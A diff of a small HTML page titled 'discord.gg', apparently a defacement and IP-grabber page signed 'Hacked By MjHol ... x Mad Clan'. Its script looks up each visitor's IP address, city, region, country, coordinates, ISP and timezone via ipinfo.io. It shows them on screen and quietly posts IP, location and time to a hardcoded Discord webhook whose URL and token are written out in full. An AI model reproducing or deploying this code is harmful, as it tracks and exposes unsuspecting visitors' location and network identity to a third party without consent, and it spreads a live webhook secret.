@@ -1,89 +1,109 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>discord.gg</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: url('https://image2url.com/r2/default/gifs/1773030220400-1d3b0461-ba25-446f-b8ae-d75db6ef81e0.gif') no-repeat center center fixed;
-            background-size: cover;
-            font-family: 'Orbitron', monospace;
-            color: #FFFFFF;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-            text-align: center;
-        }
-        .image-container img {
-            width: 650px; 
-            height: auto;
-            border: ; 
-            border-radius: 15px;
-            box-shadow: 0 0 15px rgba(128, 128, 128, 0.7); 
-        }
-        .info {
-            margin-top: 20px;
-            font-size: 1.5em;
-            color: #FFFFF; 
-            text-shadow: 0px 0px 8px #878787, 0px 0px 15px #878787, 0px 0px 25px #878787; 
-            letter-spacing: 4.5px; 
-            white-space: pre-wrap;
-        }
-        .text {
-            margin-top: 20px;
-            font-size: 3em; 
-            color:#FFFFFF; 
-            text-shadow: 0px 0px 8px #878787, 0px 0px 15px #878787, 0px 0px 25px #878787; 
-            letter-spacing: 4.5px; 
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>discord.gg</title>
+
+<style>
+body {
+    margin: 0;
+    padding: 0;
+    background: url('https://image2url.com/r2/default/gifs/1773030220400-1d3b0461-ba25-446f-b8ae-d75db6ef81e0.gif') no-repeat center center fixed;
+    background-size: 50%; /* smaller background */
+    background-color: black;
+    font-family: 'Orbitron', monospace;
+    color: #FFFFFF;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    flex-direction: column;
+    text-align: center;
+}
+
+.image-container img {
+    width: 650px;
+    height: auto;
+    border-radius: 15px;
+    box-shadow: 0 0 15px rgba(128,128,128,0.7);
+}
+
+.info {
+    margin-top: 20px;
+    font-size: 1.5em;
+    color: #FFFFFF;
+    text-shadow: 0px 0px 8px #878787, 0px 0px 15px #878787, 0px 0px 25px #878787;
+    letter-spacing: 4.5px;
+    white-space: pre-wrap;
+}
+
+.text {
+    margin-top: 20px;
+    font-size: 3em;
+    color:#FFFFFF;
+    text-shadow: 0px 0px 8px #878787, 0px 0px 15px #878787, 0px 0px 25px #878787;
+    letter-spacing: 4.5px;
+}
+</style>
 </head>
+
 <body>
 
-  
-    <audio autoplay loop>
-        <source src="https://v1.pinimg.com/videos/mc/720p/2f/8f/ff/2f8fff730efc4a6a8eb571b886baa6cc.mp4" type="audio/mpeg">
-    </audio>
-    <div class="info" id="ip-info">
-        <strong>IP: <span id="ip"></span></strong><br>
-        <span><strong>City:</strong> <span id="city"></span></span><br>
-        <span><strong>Region:</strong> <span id="region"></span></span><br>
-        <span><strong>Country:</strong> <span id="country"></span></span><br>
-        <span><strong>Location:</strong> <span id="loc"></span></span><br>
-        <span><strong>Organization:</strong> <span id="org"></span></span><br>
-        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
-    </div>
-    <div class="text">MjHol Was Here / ( BoRsHdA - 3jmi - Bo 3lwa - KH - 7mD - MaYed - Khalifa ) x Mad Clan</div>
+<audio autoplay loop>
+<source src="https://v1.pinimg.com/videos/mc/720p/2f/8f/ff/2f8fff730efc4a6a8eb571b886baa6cc.mp4" type="audio/mpeg">
+</audio>
 
-    <script>
-        fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            const { ip, country, city, region, loc, org, timezone } = data;
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.innerHTML = `<strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
+<div class="info" id="ip-info">
+<strong>IP: <span id="ip"></span></strong><br>
+<span><strong>City:</strong> <span id="city"></span></span><br>
+<span><strong>Region:</strong> <span id="region"></span></span><br>
+<span><strong>Country:</strong> <span id="country"></span></span><br>
+<span><strong>Location:</strong> <span id="loc"></span></span><br>
+<span><strong>Organization:</strong> <span id="org"></span></span><br>
+<span><strong>Timezone:</strong> <span id="timezone"></span></span>
+</div>
 
-            const dateTime = new Date().toLocaleString();
-            const webhookUrl = 'https://discordapp.com/api/webhooks/1421191942112284782/fQ10AakJpnrVH1keFgtXUrm6h0o2dVN5z5nC5SCFriz6VKZouUDi42QMvJISaKEjl1Yy';
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
-            });
-        });
+<div class="text">
+Hacked By MjHol  / ( BoRsHdA - 3jmi - Bo 3lwa - KH - 7mD - MaYed - Khalifa ) x Mad Clan
+</div>
 
-       
-   
+<script>
 
+fetch('https://ipinfo.io/json')
+.then(response => response.json())
+.then(data => {
 
-   
+const { ip, country, city, region, loc, org, timezone } = data;
 
-    </script>
+const infoDiv = document.getElementById('ip-info');
+
+infoDiv.innerHTML =
+`<strong>IP:</strong> <span>"${ip}"</span><br>
+<strong>City:</strong> <span>"${city}"</span><br>
+<strong>Region:</strong> <span>"${region}"</span><br>
+<strong>Country:</strong> <span>"${country}"</span><br>
+<strong>Location:</strong> <span>"${loc}"</span><br>
+<strong>Organization:</strong> <span>"${org}"</span><br>
+<strong>Timezone:</strong> <span>"${timezone}"</span>`;
+
+const dateTime = new Date().toLocaleString();
+
+const webhookUrl = 'https://discordapp.com/api/webhooks/1421191942112284782/fQ10AakJpnrVH1keFgtXUrm6h0o2dVN5z5nC5SCFriz6VKZouUDi42QMvJISaKEjl1Yy';
+
+fetch(webhookUrl,{
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({
+content:`IP : ${ip}
+Country & City : ${country} - ${city}
+Date & Time : ${dateTime}`
+})
+});
+
+});
+
+</script>
+
 </body>
 </html>
-
